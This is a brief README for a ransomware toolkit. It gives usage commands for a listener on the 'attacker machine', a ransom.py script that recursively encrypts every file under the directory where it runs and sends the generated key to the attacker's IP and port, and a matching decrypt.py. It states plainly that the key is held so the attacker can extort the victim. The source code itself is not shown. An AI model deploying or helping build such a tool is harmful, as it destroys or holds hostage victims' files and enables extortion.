## Requirements
pip install cryptography

## How to use
# keylistener.py
```bash
python keylistener.py
```
This just sets up the attacker machine to listen to incoming connections. When the encrypter is run on the victim's machine, the key will be sent back for the attacker to extort.

# ransom.py
```bash
python ransom.py <ip of attacker> <port attacker listening on for key>
```
Wherever this is run, it will recursively go through every subdirectory and encrypt the files using a generated key it sends back to the attacker.

# decrypt.py
```bash
python decrypt.py <encrypt key in bytes>
```
Reverse of ransom.py
